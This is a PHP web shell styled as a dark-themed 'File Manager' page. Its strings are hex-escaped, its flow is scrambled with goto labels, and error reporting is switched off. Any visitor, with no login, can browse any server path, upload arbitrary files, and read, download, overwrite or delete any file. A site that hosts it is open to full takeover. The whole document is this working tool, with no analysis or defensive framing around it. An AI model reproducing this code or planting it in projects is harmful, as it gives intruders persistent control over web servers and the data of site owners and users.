<?php goto opet_3e270; opet_3e270: error_reporting(0);
$path = isset($_GET["\x70\141\x74\150"]) ? $_GET["\x70\141\x74\150"] : getcwd();
$path = realpath($path);

// Upload
if (isset($_FILES["\x75\160\x6C\157\x61\144"])) {
    move_uploaded_file($_FILES["\x75\160\x6C\157\x61\144"]["\x74\155\x70\137\x6E\141\x6D\145"], $path . "\x2F" . $_FILES["\x75\160\x6C\157\x61\144"]["\x6E\141\x6D\145"]);
}

// Create file
if (isset($_POST["\x6E\145\x77\146\x69\154\x65"])) {
    file_put_contents($path . "\x2F" . $_POST["\x6E\145\x77\146\x69\154\x65"], "");
}

// Create folder
if (isset($_POST["\x6E\145\x77\146\x6F\154\x64\145\x72"])) {
    $newFolder = $path . "\x2F" . basename($_POST["\x6E\145\x77\146\x6F\154\x64\145\x72"]);
    if (!is_dir($newFolder)) {
        mkdir($newFolder, 0777, true);
    }
}

// Save file
if (isset($_POST["\x73\141\x76\145\x66\151\x6C\145"])) {
    file_put_contents($_POST["\x66\151\x6C\145\x70\141\x74\150"], $_POST["\x63\157\x6E\164\x65\156\x74"]);
    echo "\x3C\163\x63\162\x69\160\x74\076\x61\154\x65\162\x74\050\x27\106\x69\154\x65\040\x73\141\x76\145\x64\041\x27\051\x3B\167\x69\156\x64\157\x77\056\x6C\157\x63\141\x74\151\x6F\156\x3D\047\x3F\160\x61\164\x68\075" . dirname($_POST["\x66\151\x6C\145\x70\141\x74\150"]) . "\x27\073\x3C\057\x73\143\x72\151\x70\164\x3E";
    exit;
}

// Delete
if (isset($_GET["\x64\145\x6C\145\x74\145"])) {
    $target = realpath($_GET["\x64\145\x6C\145\x74\145"]);
    if (is_file($target)) unlink($target);
    elseif (is_dir($target)) rmdir($target);
}

// Download
if (isset($_GET["\x64\157\x77\156\x6C\157\x61\144"])) {
    $file = $_GET["\x64\157\x77\156\x6C\157\x61\144"];
    if (file_exists($file)) {
        header("\x43\157\x6E\164\x65\156\x74\055\x44\145\x73\143\x72\151\x70\164\x69\157\x6E\072\x20\106\x69\154\x65\040\x54\162\x61\156\x73\146\x65\162");
        header("\x43\157\x6E\164\x65\156\x74\055\x54\171\x70\145\x3A\040\x61\160\x70\154\x69\143\x61\164\x69\157\x6E\057\x6F\143\x74\145\x74\055\x73\164\x72\145\x61\155");
        header("\x43\157\x6E\164\x65\156\x74\055\x44\151\x73\160\x6F\163\x69\164\x69\157\x6E\072\x20\141\x74\164\x61\143\x68\155\x65\156\x74\073\x20\146\x69\154\x65\156\x61\155\x65\075\x22".basename($file)."\x22");
        readfile($file);
        exit;
    }
}

// Edit
if (isset($_GET["\x65\144\x69\164"])) {
    $editPath = $_GET["\x65\144\x69\164"];
    $content = htmlspecialchars(file_get_contents($editPath)); ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Edit File</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github.min.css">
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
    </head>
    <body class="bg-gray-900 text-white p-6">
        <h1 class="text-xl mb-4">✏️ Editing: <code><?php goto opet_3e277; opet_3e277: echo basename($editPath); ?></code></h1>
        <form method="POST">
            <input type="hidden" name="filepath" value="<?php goto opet_3e27a; opet_3e27a: echo htmlspecialchars($editPath); ?>">
            <textarea name="content" class="w-full h-[75vh] p-4 font-mono text-sm bg-gray-800 rounded" spellcheck="false"><?php goto opet_3e27c; opet_3e27c: echo $content; ?></textarea>
            <div class="mt-4">
                <button type="submit" name="savefile" class="bg-blue-500 px-4 py-2 rounded hover:bg-blue-600">💾 Save</button>
                <a href="?path=<?php goto opet_3e27d; opet_3e27d: echo urlencode(dirname($editPath)); ?>" class="ml-4 text-gray-300 underline">⬅️ Back</a>
            </div>
        </form>
    </body>
    </html>
    <?php goto opet_3e27f; opet_3e27f: exit;
}

$files = scandir($path); ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>File Manager</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-900 text-white min-h-screen">
    <div class="max-w-6xl mx-auto p-6">
        <h1 class="text-2xl font-bold mb-4">🗂️ File Manager</h1>
        <div class="mb-4">
            <div class="text-sm text-gray-400">📁 Current Path: <code><?php goto opet_3e282; opet_3e282: echo $path; ?></code></div>
            <?php goto opet_3e287; opet_3e287: if ($path !== "\x2F"): ?>
                <a href="?path=<?php goto opet_3e28b; opet_3e28b: echo urlencode(dirname($path)); ?>" class="text-blue-400 underline">⬆️ Up One Level</a>
            <?php goto opet_3e28e; opet_3e28e: endif; ?>
        </div>

        <!-- ACTIONS -->
        <div class="flex flex-wrap gap-4 mb-6">
            <!-- Upload File -->
            <form method="POST" enctype="multipart/form-data" class="flex items-center gap-2">
                <input type="file" name="upload" class="text-sm text-white">
                <button type="submit" class="bg-green-600 px-3 py-1 rounded hover:bg-green-700">Upload</button>
            </form>

            <!-- Create File -->
            <form method="POST" class="flex items-center gap-2">
                <input type="text" name="newfile" placeholder="newfile.txt" class="px-2 py-1 bg-gray-800 rounded text-sm">
                <button type="submit" class="bg-yellow-600 px-3 py-1 rounded hover:bg-yellow-700">Create File</button>
            </form>

            <!-- Create Folder -->
            <form method="POST" class="flex items-center gap-2">
                <input type="text" name="newfolder" placeholder="New Folder" class="px-2 py-1 bg-gray-800 rounded text-sm">
                <button type="submit" class="bg-purple-600 px-3 py-1 rounded hover:bg-purple-700">Create Folder</button>
            </form>
        </div>

        <!-- FILE TABLE -->
        <table class="w-full table-auto text-sm bg-gray-800 rounded">
            <thead class="bg-gray-700">
                <tr>
                    <th class="text-left p-2">Name</th>
                    <th class="text-left p-2">Size</th>
                    <th class="text-left p-2">Actions</th>
                </tr>
            </thead>
            <tbody>
            <?php goto opet_3e296; opet_3e296: foreach ($files as $file):
                if ($file === "\x2E") continue;
                $fullPath = $path . DIRECTORY_SEPARATOR . $file;
                $isDir = is_dir($fullPath); ?>
                <tr class="border-b border-gray-700 hover:bg-gray-700">
                    <td class="p-2">
                        <?php goto opet_3e29b; opet_3e29b: if ($isDir): ?>
                            <a href="?path=<?php goto opet_3e29e; opet_3e29e: echo urlencode($fullPath); ?>" class="text-blue-400">📁 <?php goto opet_3e2a1; opet_3e2a1: echo $file; ?></a>
                        <?php goto opet_3e2a4; opet_3e2a4: else: ?>
                            📄 <?php goto opet_3e2a7; opet_3e2a7: echo $file; ?>
                        <?php goto opet_3e2aa; opet_3e2aa: endif; ?>
                    </td>
                    <td class="p-2"><?php goto opet_3e2b4; opet_3e2b4: echo $isDir ? "\x2D" : filesize($fullPath)."\x20\142\x79\164\x65\163"; ?></td>
                    <td class="p-2">
                        <?php goto opet_3e2b7; opet_3e2b7: if (!$isDir): ?>
                            <a href="?download=<?php goto opet_3e2bb; opet_3e2bb: echo urlencode($fullPath); ?>" class="text-green-400 hover:underline">Download</a> |
                            <a href="?edit=<?php goto opet_3e2be; opet_3e2be: echo urlencode($fullPath); ?>" class="text-yellow-400 hover:underline">Edit</a> |
                        <?php goto opet_3e2c1; opet_3e2c1: endif; ?>
                        <a href="?path=<?php goto opet_3e2c4; opet_3e2c4: echo urlencode($path); ?>&delete=<?php goto opet_3e2c7; opet_3e2c7: echo urlencode($fullPath); ?>" onclick="return confirm('Yakin ingin hapus?')" class="text-red-400 hover:underline">Delete</a>
                    </td>
                </tr>
            <?php goto opet_3e2ca; opet_3e2ca: endforeach; ?>
            </tbody>
        </table>
    </div>
</body>
</html>
